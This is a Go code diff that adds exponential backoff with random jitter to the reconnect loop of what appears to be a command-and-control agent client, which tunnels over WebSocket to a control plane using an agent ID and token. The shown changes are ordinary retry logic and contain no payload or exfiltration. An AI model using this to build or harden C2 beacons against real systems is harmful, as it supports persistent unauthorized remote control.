@@ -6,6 +6,7 @@ import (
 	"crypto/x509"
 	"fmt"
 	"log"
+	"math/rand/v2"
 	"net/url"
 	"os"
 	"strings"
@@ -17,6 +18,12 @@ import (
 const (
 	// pongWait is the maximum time to wait for the next pong from the peer
 	pongWait = 60 * time.Second
+
+	// baseBackoff defines the baseline initial retry duration
+	baseBackoff = 1 * time.Second
+
+	// maxBackoff defines the upper bound limit for exponential backoff
+	maxBackoff = 60 * time.Second
 )
 
 // Config encapsulates parameters required to establish a secure C2 tunnel
@@ -102,10 +109,39 @@ func (c *Client) buildWebSocketURL() (string, error) {
 	return u.String(), nil
 }
 
-// Run starts the persistent full-duplex tunnel with exponential backoff resilience
+// computeBackoff calculates bounded exponential backoff with decorrelated jitter
+func computeBackoff(attempt int, base time.Duration, maxCap time.Duration) time.Duration {
+	if attempt < 0 {
+		attempt = 0
+	}
+
+	// Protect against bit shift overflow (limit to 30 shifts)
+	if attempt > 30 {
+		attempt = 30
+	}
+
+	// Calculate exponential interval: base * 2^attempt
+	multiplier := 1 << attempt
+	calculatedInterval := base * time.Duration(multiplier)
+
+	// Clamp to maximum allowed duration
+	if calculatedInterval > maxCap || calculatedInterval <= 0 {
+		calculatedInterval = maxCap
+	}
+
+	// Apply balanced jitter: 50% deterministic floor + 50% uniform randomness
+	halfInterval := calculatedInterval / 2
+	if halfInterval <= 0 {
+		return calculatedInterval
+	}
+
+	jitter := time.Duration(rand.Int64N(int64(halfInterval)))
+	return halfInterval + jitter
+}
+
+// Run starts the persistent full-duplex tunnel with exponential backoff and jitter
 func (c *Client) Run(ctx context.Context) {
-	backoff := 2 * time.Second
-	maxBackoff := 60 * time.Second
+	retryAttempt := 0
 
 	for {
 		select {
@@ -121,8 +157,8 @@ func (c *Client) Run(ctx context.Context) {
 			return
 		}
 
-		log.Printf("[*] [WS] Attempting secure C2 handshake: %s/api/v1/ws/agent/%s?token=***",
-			strings.Split(wsURL, "/api/v1")[0], c.cfg.AgentID)
+		log.Printf("[*] [WS] Attempting secure C2 handshake (Attempt %d): %s/api/v1/ws/agent/%s?token=***",
+			retryAttempt+1, strings.Split(wsURL, "/api/v1")[0], c.cfg.AgentID)
 
 		conn, resp, err := c.dialer.DialContext(ctx, wsURL, nil)
 		if err != nil {
@@ -130,22 +166,23 @@ func (c *Client) Run(ctx context.Context) {
 			if resp != nil {
 				statusCode = resp.StatusCode
 			}
-			log.Printf("[-] [WS] Connection failed (HTTP Status: %d): %v. Retrying in %v...", statusCode, err, backoff)
+
+			sleepDuration := computeBackoff(retryAttempt, baseBackoff, maxBackoff)
+			log.Printf("[-] [WS] Connection failed (HTTP Status: %d): %v. Retrying in %v (Backoff + Jitter)...",
+				statusCode, err, sleepDuration)
+
+			retryAttempt++
 
 			select {
-			case <-time.After(backoff):
-				backoff *= 2
-				if backoff > maxBackoff {
-					backoff = maxBackoff
-				}
+			case <-time.After(sleepDuration):
 				continue
 			case <-ctx.Done():
 				return
 			}
 		}
 
-		// Reset backoff on successful handshake
-		backoff = 2 * time.Second
+		// Reset retry counter upon successful full-duplex handshake
+		retryAttempt = 0
 		log.Printf("[+] [WS] Secure full-duplex tunnel established with control plane.")
 
 		c.handleConnection(ctx, conn)
